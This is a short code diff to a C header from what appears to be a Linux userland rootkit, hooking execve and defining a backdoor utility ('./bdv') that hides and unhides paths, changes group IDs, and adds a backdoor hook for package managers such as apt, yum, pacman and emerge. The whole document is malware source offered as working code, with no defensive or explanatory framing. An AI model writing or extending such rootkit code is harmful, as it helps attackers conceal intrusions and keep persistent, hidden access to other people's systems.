@@ -5,11 +5,12 @@
 #define CANTEVADE_ERR EPERM
 #endif
 
+
 #ifdef BACKDOOR_UTIL
-  /* these are all of the messages that can & will
-   * be shown upon interaction with the (un)hiding
-   * util via the exec hooks. */
-#define ERR_NO_OPTION     "valid options: 'hide', 'unhide(self)' ('changegid' if applicable) (and a path if performing a file op)"
+/* all of the messages that can/will be displayed upon interaction with `./bdv` utils. */
+
+#define ERR_NO_OPTION     "valid commands:\n\t./bdv hide/unhide <path>\n\t./bdv unhideself/changegid (if applicable)\n\t./bdv apt/yum/pacman/emerge (if applicable)\n"
+
 #define ERR_ACSS_PATH     "access failed on path. does it exist?"
 #define ALRDY_HIDDEN_STR  "path is already hidden..."
 #define PATH_HIDDEN_STR   "path now hidden"
@@ -18,12 +19,17 @@
 #define PATH_VISIBLE_STR  "path now visible"
 #define ERR_UNHIDING_PATH "error unhiding path"
 
+#ifdef BACKDOOR_PKGMAN
+static char *const validpkgmans[4] = {"apt", "yum",
+                                      "pacman", "emerge"};
+#endif
 
 void do_self(void);
 void option_err(void);
-void do_hidingutil(char *const argv[]);
-#include "hiding_util.c"
+void dobdvutil(char *const argv[]);
+#include "magicutils.c"
 #endif
+
 
 
 int execve(const char *filename, char *const argv[], char *const envp[]);
